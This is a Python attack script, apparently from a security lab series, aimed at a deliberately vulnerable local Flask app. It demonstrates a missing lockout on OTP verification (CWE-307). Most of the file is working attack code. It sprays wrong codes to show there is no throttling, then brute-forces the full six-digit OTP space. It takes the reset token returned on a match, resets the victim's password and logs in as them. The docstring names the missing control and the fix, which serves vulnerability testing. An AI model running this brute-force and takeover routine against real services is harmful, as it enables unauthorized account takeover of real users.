"""
Attack #7 — NO RATE LIMIT / LOCKOUT ON OTP VERIFY  (CWE-307)
Target: POST /verify-otp on the vulnerable Flask app (127.0.0.1:5000)

Premise
-------
/verify-otp compares the submitted OTP to the stored one and returns 200 on
match, 400 otherwise -- with NO attempt counter, NO delay, NO lockout, and
NO CAPTCHA. The OTP space is only 10^6 (six digits) and, per VULN #5, is
drawn from a non-crypto PRNG. With attempts uncapped, an attacker simply
sprays codes until one matches.

This is the ONE vulnerability in System 6 that is a rerun of the Systems 1-2
rate-limiting failure class. The fix is both a per-account/per-IP attempt cap
with lockout AND preferring a high-entropy link token over a 6-digit code
(so brute force is not even in scope).

What this script proves
-----------------------
PART A (fast, decisive): fire a burst of wrong OTPs and show that NONE are
throttled -- identical 400s, flat latency, never a 429 or lockout, no matter
how many we send. This is the actual CWE-307 evidence, and it establishes
that the full keyspace is reachable.

PART B (real crack): actually brute-force the victim's live OTP to a genuine
match and take over the account. There is no shortcut for a uniform 6-digit
code, so at the server's measured throughput this averages tens of minutes --
that runtime is the finding: only the MISSING lockout makes it possible. A
lockout after N tries would cap the attacker at N and end the attack.
Set OTP_CRACK=0 in the environment to skip Part B (keep only the fast proof).

Runs unmodified against a fresh instance.
"""

import os
import time
import json
import http.client

HOST, PORT = "127.0.0.1", 5000
VICTIM = "victim@corp.example"


def _post(conn, path, body):
    conn.request("POST", path, json.dumps(body), {"Content-Type": "application/json"})
    r = conn.getresponse()
    return r.status, r.read().decode()


def part_a_no_lockout(conn, n=3000):
    """Fire n deliberately-wrong OTPs; prove nothing throttles them."""
    print("\n[A] NO-LOCKOUT PROOF - spraying wrong OTPs, watching for any throttle:")
    _post(conn, "/forgot-password", {"email": VICTIM})   # ensure a pending OTP
    codes_seen = {}
    latencies = []
    for i in range(n):
        # Use codes from the TOP of the space so we don't accidentally hit
        # the real OTP during the "no-lockout" measurement.
        guess = f"{999999 - i:06d}"
        t0 = time.perf_counter()
        sc, _ = _post(conn, "/verify-otp", {"email": VICTIM, "otp": guess})
        latencies.append(time.perf_counter() - t0)
        codes_seen[sc] = codes_seen.get(sc, 0) + 1
    avg_ms = sum(latencies) / len(latencies) * 1000
    p_first = sum(latencies[:100]) / 100 * 1000
    p_last = sum(latencies[-100:]) / 100 * 1000
    rps = n / sum(latencies)
    print(f"    sent {n} wrong OTPs")
    print(f"    status codes returned: {codes_seen}")
    print(f"    HTTP 429 (rate limited)? {'YES' if 429 in codes_seen else 'NO - never throttled'}")
    print(f"    latency: avg {avg_ms:.2f} ms | first-100 {p_first:.2f} ms | last-100 {p_last:.2f} ms")
    print(f"    -> no backoff: latency is flat from first to last attempt")
    print(f"    measured throughput ~ {rps:.0f} req/s")
    exp = 5e5 / rps
    print(f"    => full 10^6 keyspace is reachable; expected crack ~ {exp:.0f}s "
          f"({exp/60:.1f} min), worst ~ {exp*2/60:.1f} min. A lockout would cap this at N tries.")
    return rps


def part_b_real_crack(conn):
    """Actually brute-force the live OTP to a real match (no shortcut)."""
    print("\n[B] REAL CRACK - brute-forcing the victim's live OTP to takeover:")
    # Fresh pending OTP to crack. (Uses the oldest token row for this email;
    # on a fresh instance that is this one.)
    _post(conn, "/verify-otp", {"email": VICTIM, "otp": "000000"})  # warmup/noop
    t0 = time.perf_counter()
    found = None
    attempts = 0
    for n in range(1_000_000):
        attempts += 1
        sc, body = _post(conn, "/verify-otp", {"email": VICTIM, "otp": f"{n:06d}"})
        if sc == 200:
            found = (f"{n:06d}", json.loads(body))
            break
        if attempts % 25000 == 0:
            rate = attempts / (time.perf_counter() - t0)
            print(f"    ...{attempts} tries, no match yet ({rate:.0f} req/s)")
    dt = time.perf_counter() - t0
    if not found:
        print("    [-] Not found within 10^6 - unexpected.")
        return
    otp, payload = found
    print(f"    CRACKED OTP = {otp} after {attempts} attempts in {dt:.1f}s "
          f"({attempts/dt:.0f} req/s)")
    print(f"    /verify-otp returned the reset token: {payload.get('token')}")
    # Payoff: use the leaked token to reset + take over.
    tok = payload.get("token")
    sc, body = _post(conn, "/reset-password",
                     {"token": tok, "new_password": "otp_bruteforced_1", "email": VICTIM})
    print(f"    reset via cracked token -> HTTP {sc}: {body.strip()}")
    sc, body = _post(conn, "/login", {"email": VICTIM, "password": "otp_bruteforced_1"})
    print(f"    login as victim -> HTTP {sc}: {body.strip()}")


def main():
    print("=" * 68)
    print("ATTACK #7 - OTP brute force via missing rate limit / lockout")
    print("Target:", f"http://{HOST}:{PORT}")
    print("=" * 68)
    conn = http.client.HTTPConnection(HOST, PORT)
    part_a_no_lockout(conn)
    if os.environ.get("OTP_CRACK", "1") != "0":
        part_b_real_crack(conn)
    else:
        print("\n[B] skipped (OTP_CRACK=0) - Part A already proves the missing control.")
    print("\n" + "-" * 68)
    print("[+] ATTACKER GAIN - unlimited OTP attempts let brute force reach the")
    print("    entire 10^6 space; combined with the low entropy this yields")
    print("    account takeover. The control that was missing is a per-account/")
    print("    per-IP attempt cap with lockout. (CWE-307)")
    print("-" * 68)


if __name__ == "__main__":
    main()
